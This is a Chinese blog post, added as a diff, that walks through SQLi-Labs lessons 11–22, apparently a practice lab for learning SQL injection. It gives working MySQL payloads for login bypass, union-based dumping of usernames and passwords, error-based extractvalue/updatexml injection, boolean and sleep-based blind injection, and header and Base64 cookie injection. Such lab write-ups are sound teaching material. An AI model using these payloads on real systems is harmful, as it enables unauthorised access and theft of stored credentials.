@@ -1,0 +1,621 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head>
+	<title>SQLi-Labs-基础题11-22指南</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="MR.TER">
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class=page-name>当前文章&nbsp;:&nbsp;《SQLi-Labs-基础题11-22指南》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		11/19/2018 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://wu125.github.io/groundback/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i  class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="标签">标签</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/11/19/SQLi-Labs-基础题11-22指南/" itemprop="url">		
+			SQLi-Labs-基础题11-22指南		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/11/19/SQLi-Labs-基础题11-22指南/" itemprop="url">
+	<time datetime="2018-11-19T07:00:41.000Z" itemprop="datePublished">
+  		2018-11-19
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h3 id="SQLI-和-sqli-labs"><a href="#SQLI-和-sqli-labs" class="headerlink" title="SQLI 和 sqli-labs"></a>SQLI 和 sqli-labs</h3><p>SQLI，sql injection，我们称之为 sql 注入。何为 sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有 MySQL，MS SQL ,Oracle 以及 Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接 sql 语句的时候，我们可以改变 sql 语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。</p>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>下面简单介绍mysql注入要了解的一些基础内容。</p>
+<p><strong>（1）注入分类</strong></p>
+<pre><code>- **基于从服务器接收到的响应**
+    - 基于错误的 SQL 注入
+    - 联合查询的类型
+    - 堆查询注入
+    - SQL盲注
+        -  ----基于布尔 SQL 盲注Mysql 
+        -  ----基于时间的 SQL 盲注
+        -  ----基于报错的 SQL 盲注
+- **基于如何处理输入的 SQL 查询（数据类型）**
+    - 基于字符串
+    - 数字或整数为基础的
+- **基于程度和顺序的注入(哪里发生了影响)**
+    - 一阶注入
+    - 二阶注入
+    - 一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. 
+- **基于注入点的位置上的**
+    - 通过用户输入的表单域的注入。
+    - 通过 cookie 注入。
+    - 通过服务器变量注入。（基于头部信息的注入）
+</code></pre><p><strong>（2）常用函数</strong></p>
+<pre><code>查询数据库信息
+- version()——MySQL 版本 
+- user()——数据库用户名 
+- database()——数据库名 
+- @@datadir——数据库路径 
+- @@versioncompileos——操作系统
+
+字符串连接函数
+ - concat(str1,str2,...)没有分隔符地连接字符串
+- concat_ ws(separator,str1,str2,...)含有分隔符地连接字符串 
+- group_concat(str1,str2,...)连接一个组的所有字符串，并以逗号分隔每一条数据
+</code></pre><p><strong>（3）一般测试注入的尝试语句</strong></p>
+<pre><code>- Ps:--+可以用#替换，url 提交过程中 Url 编码后的#为%23
+- or 1=1--+
+- &apos;or 1=1--+
+- &quot;or 1=1--+
+- )or 1=1--+
+- &apos;)or 1=1--+
+- &quot;) or 1=1--+
+- &quot;))or 1=1--+ 
+- 一般的代码为：$id=$_GET[&apos;id&apos;];
+- $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+- 此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，  一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用--+ 或者 #(%23)
+</code></pre><p><strong>(4)union联合查询操作符</strong></p>
+<pre><code>- UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT
+- 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的
+- 列的顺序必须相同。
+- SQL UNION 语法SELECT column_ name(s) FROM table_name1
+- UNION
+- SELECT column_ name(s) FROM table_name2
+- 注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。
+- SQL UNION ALL 语法SELECT column_ name(s) FROM table_name1
+- UNION ALL
+- SELECT column_ name(s) FROM table_name2
+- 另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列
+</code></pre><p><strong>(5)sql查询中的逻辑运算</strong></p>
+<pre><code>- 提出一个问题 Select * from users where id=1 and 1=1; 这条语句为什么能够选择出 id=1
+- 的内容，and 1=1 到底起作用了没有？这里就要清楚 sql 语句执行顺序了。
+- 同时这个问题我们在使用万能密码的时候会用到。
+- 
+- Select * from admin where username=’admin’ and password=’admin’
+- 我们可以用 ’or 1=1# 作为密码输入。原因是为什么？
+- 这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为：
+- Select * from admin where username=’admin’ and password=’’or 1=1#’
+- 
+- Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。
+- 原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 username=’admin’ and
+- password=’’or 1=1。三个条件用 and 和 or 进行连接。在 sql 中，我们 and 的运算优先
+- 级大于 or 的元算优先级。因此可以看到 第一个条件（用 a 表示）是真的，第二个条件（用
+- b 表示）是假的，a and b = false,第一个条件和第二个条件执行 and 后是假，再与第三
+- 个条件 or 运算，因为第三个条件 1=1 是恒成立的，所以结果自然就为真了。因此上述的语
+- 句就是恒真了
+</code></pre><p><strong>(6)一般注入流程</strong></p>
+<pre><code>- 我们知道一个数据库中有很多数据表，数据表中有很多的列也叫做字段，在列中存储着数据。我们一般想要获取
+- 的就是这些数据，所以，一般的注入就是先差数据库名，然后在根据数据库名查其下的数据表名，然后就是数据
+- 表下的列，最后再查询数据。
+</code></pre><h3 id="Less-11-POST-–-Error-Based-–-Single-quotes-–-String-基于错误-单引号-字符串"><a href="#Less-11-POST-–-Error-Based-–-Single-quotes-–-String-基于错误-单引号-字符串" class="headerlink" title="Less-11:POST – Error Based – Single quotes – String(基于错误-单引号-字符串)"></a>Less-11:POST – Error Based – Single quotes – String(基于错误-单引号-字符串)</h3><p><img src="https://i.imgur.com/3dnE9iY.png" alt=""></p>
+<p>这里输入非正确的随意的字符显示登陆失败，输入单引号，给出错误信息提示</p>
+<p><img src="https://i.imgur.com/3Ds0o38.png" alt=""></p>
+<p>根据提示大致可得出SQL语句应该是select username, password from where username=” and password=” LIMIT 0,1</p>
+<p>像这样的查询要想绕过登陆：一般第一个输入字段用注释，第二个输入字段用可以闭合和注释。</p>
+<p>注释绕过：在username中输入：<code>1&#39; or 1=1 #</code></p>
+<p>闭合绕过：在password中输入：<code>1&#39; or &#39;1&#39;=&#39;1</code></p>
+<p>关于具体的原理分析可以看这篇文章<a href="https://wu125.github.io/2018/10/31/SQL注入攻击简析/">https://wu125.github.io/2018/10/31/SQL注入攻击简析/</a></p>
+<p>下面就注入试试:<br>查询字段位：输入<code>1&#39; order by 3#</code></p>
+<p><img src="https://i.imgur.com/dIKXiPH.png" alt=""></p>
+<p>给出提示，显示表明没有3个字段<br>重新输入<code>1&#39; order by 2#</code></p>
+<p><img src="https://i.imgur.com/7neHbXM.png" alt=""></p>
+<p>没有提示信息，表明查询的字段位是2个字段</p>
+<p>查询显示位：输入<code>1&#39; union select 1,2#</code></p>
+<p><img src="https://i.imgur.com/tgdVtmx.png" alt=""></p>
+<p>可以看出有两个显示位，下面就能利用显示位查询出我们想要的信息</p>
+<p>查询数据库名和版本信息：输入<code>1&#39; union select database(),version()#</code></p>
+<p><img src="https://i.imgur.com/UnDzNkw.png" alt=""></p>
+<p>查询表名和列名:输入</p>
+<pre><code>1&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)#
+</code></pre><p><img src="https://i.imgur.com/bXo9WJx.png" alt=""></p>
+<p>查询users表里得username,和password字段得数据信息：输入</p>
+<pre><code>1&apos; union select (select group_concat(username) from security.users),(select group_concat(password) from security.users)#
+</code></pre><p><img src="https://i.imgur.com/J5YU7Uv.png" alt=""></p>
+<p>同时也可以进行盲注测试获取数据库信息：<br>比如测试数据库名的长度为多少,输入:<code>1&#39; or length(database()=7)#</code>在Username或Password输入都是可以的</p>
+<p><img src="https://i.imgur.com/UL9V5ox.png" alt=""></p>
+<p>这里返回失败说明length（database()=7)是错误的，继续测试输入<code>1&#39; or length(database()=8)#</code></p>
+<p><img src="https://i.imgur.com/g3PI7c6.png" alt=""></p>
+<p>可以看出这里成功了，就说明length(database()=8)是正确的，就测试出数据库名字的长度是8，<br>当然对于盲注的具体实现还是要通过脚本去测试。</p>
+<h3 id="Less-12-POST-–-Error-Based-–-Double-quotes-–-String-–-with-twist-基于错误-双引号-字符串-括号"><a href="#Less-12-POST-–-Error-Based-–-Double-quotes-–-String-–-with-twist-基于错误-双引号-字符串-括号" class="headerlink" title="Less-12:POST – Error Based – Double quotes – String – with twist(基于错误-双引号-字符串-括号)"></a>Less-12:POST – Error Based – Double quotes – String – with twist(基于错误-双引号-字符串-括号)</h3><p>首先输入单引号，没有返回错误信息，<br>再输入双引号试试，</p>
+<p><img src="https://i.imgur.com/Q3U25rS.png" alt=""></p>
+<p>返回出错误信息提示，由提示我们可以看出SQL语句应该是select username, password from where username=(“”) and password=(“”) LIMIT 0,1<br>这里用 ) 将字符串闭合起来，输入注入：<code>1&quot;) or 1=1#</code></p>
+<p><img src="https://i.imgur.com/8ciBD5v.png" alt=""></p>
+<p>成功登陆上去，后面的测试就跟11题的操作一样了。</p>
+<h3 id="Less-13-POST-–-Double-Injection-–-Single-quotes-–-String-–-with-twist-双注入-单引号-字符串-括号"><a href="#Less-13-POST-–-Double-Injection-–-Single-quotes-–-String-–-with-twist-双注入-单引号-字符串-括号" class="headerlink" title="Less-13:POST – Double Injection – Single quotes – String – with twist(双注入-单引号-字符串-括号)"></a>Less-13:POST – Double Injection – Single quotes – String – with twist(双注入-单引号-字符串-括号)</h3><p>依旧先输入单引号看看</p>
+<p><img src="https://i.imgur.com/3IqzriX.png" alt=""> </p>
+<p>可以得出sql语句应该是select username, password from where username(‘’) and password=(‘’) LIMIT 0,1 对输入的字符串进行了’)处理，输入注入：<code>1&#39;) or 1=1#</code><br><img src="https://i.imgur.com/SKFYkAl.png" alt=""><br>可以看出这里我们登陆成功了，但是没有跟前面一样显示出username和password的数据内容，这里应该就是没有显示位了，那么我们要怎么处理呢，首先我们可以像Less-5,用报错注入返回数据信息进行测试<br>我们先输入：<br>     <code>1&#39;) union select 1,count(*),concat(database(),floor(rand(0)*2))a from information_schema.columns group by a#</code><br><img src="https://i.imgur.com/PsaTaW1.png" alt=""><br>显示说明我们查询的字段数不匹配，应该是两个字段，我们修改一下输入：<code>1&#39;) union select count(*),concat(database(),floor(rand(0)*2))a from information_schema.columns group by a#</code><br><img src="https://i.imgur.com/g1Z2E2x.png" alt=""><br>可以看出已经给出我们要的数据库名的信息，后面我们就可以继续查询表，列，数据的信息了。</p>
+<p>关于报错注入，这里我也总结了一点可以去看一下<a href="https://wu125.github.io/2018/10/11/报错型注入学习/">https://wu125.github.io/2018/10/11/报错型注入学习/</a></p>
+<p>当然也是可以利用盲注进行测试的。这里也就不细说了。一般就是写个脚本跑一下</p>
+<h3 id="Less-14-POST-–-Double-Injection-–-Single-quotes-–-String-–-with-twist-双注入-单引号-字符串-括号"><a href="#Less-14-POST-–-Double-Injection-–-Single-quotes-–-String-–-with-twist-双注入-单引号-字符串-括号" class="headerlink" title="Less-14:POST – Double Injection – Single quotes – String – with twist(双注入-单引号-字符串-括号)"></a>Less-14:POST – Double Injection – Single quotes – String – with twist(双注入-单引号-字符串-括号)</h3><p>这一课和上一课的名字是一样的，我们输入单引号试试，失败没有返回信息提示，继续双引号测试<br><img src="https://i.imgur.com/7ekijmH.png" alt=""></p>
+<p>可以看出这里应该是双引号没有括号的处理，我们可以输入:<code>1&quot; or 1=1#</code>成功登陆，下面就可以通过报错注入或盲注进行测试了<br>比如查询数据库名输入：<code>1&quot; union select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a#</code></p>
+<p><img src="https://i.imgur.com/f9bEgzE.png" alt=""></p>
+<p>查询数据表名输入：<code>1&quot; union select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2))a from information_schema.columns group by a#</code><br><img src="https://i.imgur.com/6ttyLrN.png" alt=""><br>这里我们发现没有返回报错信息，成功登陆了，应该是group_concat()造成的，我们修改输入为：<code>1&quot; union select count(*),concat((select table_name from information_schema.tables where table_schema=database()limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#</code><br><img src="https://i.imgur.com/CacnbGG.png" alt=""></p>
+<p>成功返回第一个数据表的名字。</p>
+<h3 id="Less-15-POST-–-Blind-–-Boolian-time-Based-–-Single-quotes-盲注-基于布尔结果-基于时间延迟-单引号"><a href="#Less-15-POST-–-Blind-–-Boolian-time-Based-–-Single-quotes-盲注-基于布尔结果-基于时间延迟-单引号" class="headerlink" title="Less-15:POST – Blind – Boolian/time Based – Single quotes(盲注-基于布尔结果/基于时间延迟-单引号)"></a>Less-15:POST – Blind – Boolian/time Based – Single quotes(盲注-基于布尔结果/基于时间延迟-单引号)</h3><p>这里输入单引号，双引号都是失败，且没有错误信息提示，我们输入：<code>1&#39; or 1=1#</code></p>
+<p><img src="https://i.imgur.com/TUrHPEW.png" alt=""></p>
+<p>显示成功登录，那么这就是一个单引号盲注</p>
+<p>盲注肯定还是脚本跑一下是最好的，下面我就进行几项简单的手工盲注测试：</p>
+<p>输入：<code>1&#39; or length(database())=x#</code>,(x=1,2,3…)；当显示成功登录就说明此时x是数据库的长度了。</p>
+<p>输入：<code>1&#39; or left(database(),1)=&#39;x&#39;#</code>,(x=a,b,c…)；这是通过字母进行数据库名的猜测测试。</p>
+<p><img src="https://i.imgur.com/pZx1UfY.png" alt=""><br>还有通过ascii码猜测，</p>
+<p>比如输入：<code>1&#39; or ascii(substr((select database()),1,1))=115#</code><br><img src="https://i.imgur.com/Yl5kt53.png" alt=""></p>
+<p>结果显示成功说明数据库名的第一个字符的ascii码是115，对应的字符是’s’</p>
+<p>再进行表、列的猜测,只要修改成这样的形式：<code>1&#39; or ascii(substr((查询语句),1,1)=x#</code>就能实现。</p>
+<h3 id="Less-16-POST-–-Blind-–-Boolian-time-Based-–-Double-quotes-盲注-基于布尔结果-基于时间延迟-双引号"><a href="#Less-16-POST-–-Blind-–-Boolian-time-Based-–-Double-quotes-盲注-基于布尔结果-基于时间延迟-双引号" class="headerlink" title="Less-16:POST – Blind – Boolian/time Based – Double quotes(盲注-基于布尔结果/基于时间延迟-双引号)"></a>Less-16:POST – Blind – Boolian/time Based – Double quotes(盲注-基于布尔结果/基于时间延迟-双引号)</h3><p>这道题同样的输入单双引号显示失败，没有错误信息显示，<br>我们分别输入：</p>
+<pre><code>1&apos; or 1=1#    
+1&apos;) or 1=1#
+1&quot; or 1=1#
+1&quot;) or 1=1#
+</code></pre><p><img src="https://i.imgur.com/50XGVLl.png" alt=""><br>最后输入的<code>1&quot;) or 1=1#</code>返回显示成功，所以这又是一个双引号闭合的盲注。</p>
+<p>上面的布尔盲注的操作都是可行的，这里再我们通过时间盲注进行简单的猜测测试：</p>
+<p>首先我们输入：<code>1&quot;) or if(ascii(substr((select database()),1,1))=115,1,sleep(5))#</code><br><img src="https://i.imgur.com/tDTOAlK.png" alt=""></p>
+<p>可以看出如果正确直接登录，不正确就会有时间延迟</p>
+<p>表猜测输入：</p>
+<p><code>1&quot;) or if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,1,sleep(5))#</code></p>
+<p><img src="https://i.imgur.com/WCsn1iH.png" alt=""><br>这里也是直接就返回出成功登录了，如果错误的话就会有很长的延迟。</p>
+<p>列猜测输入：</p>
+<p> <code>1&quot;) or if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1))=110,1,sleep(5))#</code></p>
+<p>通过测试可以得出users表第一个字段的第一个字母ascii码是110，也就是字母’n’</p>
+<p>关于布尔盲注和时间盲注的学习，可以去这篇博客上去看一看<br><a href="https://blog.csdn.net/pygain/article/details/53086389" target="_blank" rel="noopener">https://blog.csdn.net/pygain/article/details/53086389</a></p>
+<h3 id="Less-17-POST-–-Update-Query-–-Error-Based-–-String-更新查询-基于错误-字符串"><a href="#Less-17-POST-–-Update-Query-–-Error-Based-–-String-更新查询-基于错误-字符串" class="headerlink" title="Less-17:POST – Update Query – Error Based – String(更新查询-基于错误-字符串)"></a>Less-17:POST – Update Query – Error Based – String(更新查询-基于错误-字符串)</h3><p>这是一个利用update语句的更新密码的过程，执行的SQL语句应该是<br>updata users set password=’ ‘ where username=’ ‘<br><img src="https://i.imgur.com/NTAzOt0.png" alt=""><br>我们随意输入的username是不可行的，因为这里对username进行了过滤，必须是一个有效的用户名，</p>
+<p>这里我们知道admin是一个已有用户名，我们就直接用这个测试了，我们在new password中输入单引号<br><img src="https://i.imgur.com/2GRWvg3.png" alt=""><br>显示出错误信息提示，说明对密码进行了单引号处理，<br>直接利用报错盲注</p>
+<p>这里先介绍一下报错注入的几种函数</p>
+<pre><code>extractvalue(xml_frag,xpath_expr)
+</code></pre><p>extractvalue()接受两个字符串参数，一个xml标记<code>xml_frag</code>的片段和一个xpath表达式<code>xpath_expr</code>(也称为定位符)。这个函数返回第一个文本节点的文本。在mysql 5.6.6及更早版本中，xpath表达式最多可以包含127个字符。这个限制在mysql 5.6.7中解除。我们可以在xpath中填写获得我们想要的信息的语句。</p>
+<pre><code>updatexml(xml_target,xpath_expr,new_xml)
+</code></pre><p>此函数用新的xml片段<code>new_xml</code>替换xml标记<code>xml_target</code>的给定片段的单个部分，然后返回更改的xml。被替换的<code>xml_target</code>的部分与用户提供的xpath表达式<code>xpath_expr</code>匹配。在 mysql 5.6.6及更早版本中，xpath表达式最多可以包含127个字符。这个限制在mysql 5.6.7中解除。如果没有找到匹配<code>xpath_expr</code>的表达式，或者找到多个匹配项，函数将返回原始的<code>xml_target</code>片段。 所有三个参数应该是字符串。我们可以在xpath中填写获得我们想要的信息的语句。</p>
+<p>下面就利用以上函数进行注入查询，</p>
+<p>输入： <code>1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code><br><img src="https://i.imgur.com/3gsDF5w.png" alt=""></p>
+<p>输入：<code>1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)#</code><br><img src="https://i.imgur.com/RqTUlc8.png" alt=""></p>
+<p>对于数据表，列，具体数据的查询修改<code>xpath_expr</code>表达式的查询语句就能实现<br>跟前面的一样。</p>
+<h3 id="Less-18-POST-–-Header-Injection-–-Uagent-field-–-Error-based-头部注入-Uagent字段-基于错误"><a href="#Less-18-POST-–-Header-Injection-–-Uagent-field-–-Error-based-头部注入-Uagent字段-基于错误" class="headerlink" title="Less-18:POST – Header Injection – Uagent field – Error based(头部注入-Uagent字段-基于错误)"></a>Less-18:POST – Header Injection – Uagent field – Error based(头部注入-Uagent字段-基于错误)</h3><p>首先这里对username和password都进行了过滤处理，所以这里是无法注入的了，那么能从哪里注入呢。<br><img src="https://i.imgur.com/cOV6kuX.png" alt=""></p>
+<p>我们先利用已经知道的username和password登录上去看看。输入admin<br><img src="https://i.imgur.com/B9juvVf.png" alt=""></p>
+<p>页面返回User Agent的信息内容，那么注入点是否在这里呢。我们试试修改一下User-Agent的内容，重新发送看看响应效果是怎样的。这里我们可以直接在火狐的开发者工具中进行编辑重发</p>
+<p><img src="https://i.imgur.com/cC6iKt8.png" alt=""></p>
+<p>我们在User-Agent中输入单引号，重发看下响应<br><img src="https://i.imgur.com/HfvfYkl.png" alt=""></p>
+<p>发现给出错误信息提示，这里我们就可以注入了，下面就开始注入操作了。</p>
+<p>输入:<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1),&#39;#</code>或者</p>
+<pre><code>&apos; or extractvalue(1,concat(0x7e,(select database()),0x7e)),&apos;#
+</code></pre><p><img src="https://i.imgur.com/ltSfNCC.png" alt=""></p>
+<p>后面的就是修改查询的语句就行了。</p>
+<h3 id="Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19:POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>Less-19:POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h3><p>这里一看应该是跟前面一样的情况，直接先登录</p>
+<p><img src="https://i.imgur.com/OqXzVrr.png" alt=""></p>
+<p>看到返回Referer的信息，那么注入的点应该就是Referer字段了。<br>我们测试一下看看，输入单引号</p>
+<p><img src="https://i.imgur.com/QgL51M6.png" alt=""><br>给出错误信息提示，后面的注入就跟前一题一样了。</p>
+<h3 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="Less-20:POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)"></a>Less-20:POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</h3><p>这里我们通过简单的测试，可以发现依旧是无法绕过登录，只能用存在的用户才能成功登录，这跟现实中的先注册登录再注入很贴合。所以我们依旧是先用admin登录</p>
+<p><img src="https://i.imgur.com/UdicaRp.png" alt=""></p>
+<p>这里我们看到页面返回User Agent和cookie的信息。以及删除Cookie的选项。<br>我们可以先尝试user Agent是否存在注入的点，通过简单的测试可以看出User Agent并没有返回错误信息提示。注入的点也就不在这<br><img src="https://i.imgur.com/dj2reNo.png" alt=""></p>
+<p>然后我们试试cookie<br><img src="https://i.imgur.com/SSRXlP3.png" alt=""><br>返回错误信息提示，那么再试试能否注入<br>输入：<code>&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e))#</code><br><img src="https://i.imgur.com/epwbqYc.png" alt=""><br>注入成功，返回出数据库名，后面的应该也是一样可行的。这里联合查询也是可以的。<br><img src="https://i.imgur.com/pZpiudq.png" alt=""></p>
+<p><img src="https://i.imgur.com/q7qyD9M.png" alt=""></p>
+<h3 id="Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21:Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)"></a>Less-21:Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</h3><p>先登录上去看看<br><img src="https://i.imgur.com/HXDp7pr.png" alt=""><br>我们可以看出返回的信息跟上一题很相识，不同的就是uname被Base64编码了<br>那么我们就将语句用Base64编码一下，输入试试<br>输入admin’=<code>YWRtaW4n</code>(Base64编码）</p>
+<p><img src="https://i.imgur.com/4CdPH9C.png" alt=""><br>返回错误信息提示，可以看出做了单引号和括号的处理。<br>我们输入admin’)#= <code>YWRtaW4nKSM=</code></p>
+<p><img src="https://i.imgur.com/s4MFl7J.png" alt=""></p>
+<p>页面返回正常，那么我们就可以注入了，把注入的语句用Base64编码一下就ok了。<br>输入：’) or extractvalue(1,concat(0x7e,(select database()),0x7e))#<br>=<code>Jykgb3IgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkj</code></p>
+<p><img src="https://i.imgur.com/sjnmm2L.png" alt=""><br>后面的操作跟前面的一样</p>
+<h3 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22:Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>Less-22:Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h3><p>登录上去发现返回的结果跟上一题是一样的</p>
+<p><img src="https://i.imgur.com/W07AHtt.png" alt=""></p>
+<p>先输入:admin’=<code>YWRtaW4n</code>(Base64编码)</p>
+<p><img src="https://i.imgur.com/XHBLgsf.png" alt=""><br>没有返回信息，我们再输入admin”=<code>YWRtaW4i</code></p>
+<p><img src="https://i.imgur.com/1HJMpiZ.png" alt=""></p>
+<p>返回错误信息提示，也可以看这里是做了双引号处理，那么我们就构造双引号的注入语句，<br>输入：” or extractvalue(1,concat(0x7e,(select database()),0x7e))# =<code>IiBvciBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSM=</code><br><img src="https://i.imgur.com/BsiBhX6.png" alt=""><br>成功注入，这题就是双引号的Base64编码跟前面的都是一样的。</p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/10/31/SQL注入攻击简析/" title="SQL注入攻击简析">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment valine -->
+			<!-- show valine comment -->
+<div id="valineComment" class="comment"></div>
+
+<!-- valine`s js & css -->
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/js/valine.min.js"></script>
+<link rel="stylesheet" href="/css/comment.css">
+
+<script>
+	var checkExistComment = setInterval(function() {
+		if( $('#valineComment').length ) {
+			new Valine({
+				// AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+				av: AV,
+				//使用id寻找div元素（使用class可能找不到）
+				el: '#valineComment',
+				emoticon_url: 'https://cloud.panjunwen.com/alu',
+				emoticon_list: ["吐.png", "期待.png", "高兴.png", "吐血倒地.png", "哭泣.png", "欢呼.png"],
+				app_id: "3333....", //获取APP ID
